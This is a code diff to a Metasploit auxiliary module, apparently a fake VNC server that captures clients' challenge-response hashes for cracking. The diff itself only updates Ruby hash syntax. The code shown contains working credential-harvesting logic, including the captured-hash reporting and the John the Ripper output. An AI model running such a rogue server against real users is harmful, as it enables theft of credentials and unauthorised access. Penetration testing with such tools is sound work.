@@ -50,12 +50,12 @@ class Metasploit3 < Msf::Auxiliary
 
   def on_client_connect(c)
     @state[c] = {
-      :name    => "#{c.peerhost}:#{c.peerport}",
-      :ip      => c.peerhost,
-      :port    => c.peerport,
-      :pass    => nil,
-      :chall   => nil,
-      :proto   => nil
+      name: "#{c.peerhost}:#{c.peerport}",
+      ip: c.peerhost,
+      port: c.peerport,
+      pass: nil,
+      chall: nil,
+      proto: nil
     }
 
     c.put "RFB 003.007\n"
@@ -92,15 +92,15 @@ class Metasploit3 < Msf::Auxiliary
       print_status("#{peer} - Challenge: #{@challenge.unpack('H*')[0]}; Response: #{data.unpack('H*')[0]}")
       hash_line = "$vnc$*#{@state[c][:chall].unpack("H*")[0]}*#{data.unpack('H*')[0]}"
       report_auth_info(
-        :host  => c.peerhost,
-        :port => datastore['SRVPORT'],
-        :sname => 'vnc_client',
-        :user => "",
-        :pass => hash_line,
-        :type => "vnc_hash",
-        :proof => hash_line,
-        :source_type => "captured",
-        :active => true
+        host: c.peerhost,
+        port: datastore['SRVPORT'],
+        sname: 'vnc_client',
+        user: "",
+        pass: hash_line,
+        type: "vnc_hash",
+        proof: hash_line,
+        source_type: "captured",
+        active: true
       )
 
       if(datastore['JOHNPWFILE'])
